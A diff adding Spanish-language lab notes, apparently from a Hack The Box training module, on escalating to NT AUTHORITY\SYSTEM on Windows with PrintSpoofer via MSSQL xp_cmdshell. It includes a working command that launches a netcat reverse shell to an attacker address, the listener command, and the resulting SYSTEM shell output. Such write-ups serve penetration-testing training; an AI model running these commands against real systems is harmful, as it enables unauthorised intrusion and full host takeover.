@@ -325,3 +325,93 @@ El comando `whoami` confirma la obtención de una shell con **privilegios de SYS
 * JuicyPotato explota la reflexión DCOM/NTLM para obtener un token privilegiado.
 * La cuenta con `SeImpersonatePrivilege` o `SeAssignPrimaryTokenPrivilege` puede suplantar al usuario SYSTEM.
 * La explotación culmina con la obtención de una shell remota con privilegios máximos en el sistema comprometido.
+
+
+---
+
+---
+
+---
+
+
+🚀 Escalada de privilegios usando PrintSpoofer y RoguePotato
+
+**Descripción general**
+
+En versiones modernas de Windows (Windows Server 2019 y Windows 10 build 1809 en adelante), el método clásico de **JuicyPotato** ya no funciona debido a los parches aplicados por Microsoft que bloquean la reflexión NTLM local.
+
+Sin embargo, herramientas más recientes como **PrintSpoofer** y **RoguePotato** permiten aprovechar los mismos privilegios (`SeImpersonatePrivilege` o `SeAssignPrimaryTokenPrivilege`) para obtener acceso con nivel **NT AUTHORITY\SYSTEM** mediante vectores distintos.
+
+* **RoguePotato** utiliza un enfoque similar a JuicyPotato, pero emplea puertos HTTP/SMB y canales alternativos para evadir las restricciones locales.
+* **PrintSpoofer**, en cambio, abusa del servicio de impresión de Windows (Spooler Service), que también se ejecuta como SYSTEM, para crear un token privilegiado y suplantarlo.
+
+---
+
+**Escalada de privilegios con PrintSpoofer**
+
+En este ejemplo, usaremos **PrintSpoofer** para obtener una shell SYSTEM en el equipo víctima. La idea es idéntica: explotar `SeImpersonatePrivilege` para crear un proceso privilegiado, pero usando el canal del spooler en lugar de DCOM.
+
+1. Nos conectamos nuevamente al servidor MSSQL utilizando **mssqlclient.py**.
+
+2. Desde la consola SQL, ejecutamos **PrintSpoofer** con el argumento `-c` para definir el comando a ejecutar bajo el contexto de SYSTEM:
+
+```
+SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
+```
+
+Donde:
+
+* `-c` → especifica el comando que se ejecutará con privilegios de SYSTEM.
+* `nc.exe` → se usa nuevamente para crear una shell reversa.
+* `-e cmd` → redirige la entrada/salida de `cmd.exe` a través de la conexión Netcat.
+
+---
+
+**Salida esperada**
+
+```
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+NULL
+```
+
+Estos mensajes confirman que:
+
+* La herramienta detectó el privilegio `SeImpersonatePrivilege`.
+* Se estableció comunicación con el servicio de impresión (spooler).
+* Se creó correctamente un proceso bajo el contexto de SYSTEM.
+
+---
+
+**Catching Reverse Shell as SYSTEM**
+
+En el equipo atacante:
+
+```
+CyberWolfSec@htb[/htb]$ nc -lnvp 8443
+
+listening on [any] 8443 ...
+connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 49847
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+```
+
+La salida confirma que la conexión se estableció exitosamente y que ahora tenemos una shell interactiva con privilegios de **NT AUTHORITY\SYSTEM**.
+
+---
+
+**Conclusión**
+
+* **JuicyPotato** fue mitigado en sistemas modernos, pero **PrintSpoofer** y **RoguePotato** ofrecen alternativas efectivas.
+* Ambos explotan los mismos privilegios (`SeImpersonatePrivilege` o `SeAssignPrimaryTokenPrivilege`).
+* Es fundamental conocer varias técnicas de escalada, ya que su efectividad depende de la versión y configuración del sistema operativo objetivo.
+
+```
+Privilegios: SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege
+Vector: DCOM (JuicyPotato), RPC/Spooler (PrintSpoofer), SMB/HTTP (RoguePotato)
+Resultado: NT AUTHORITY\SYSTEM
+```
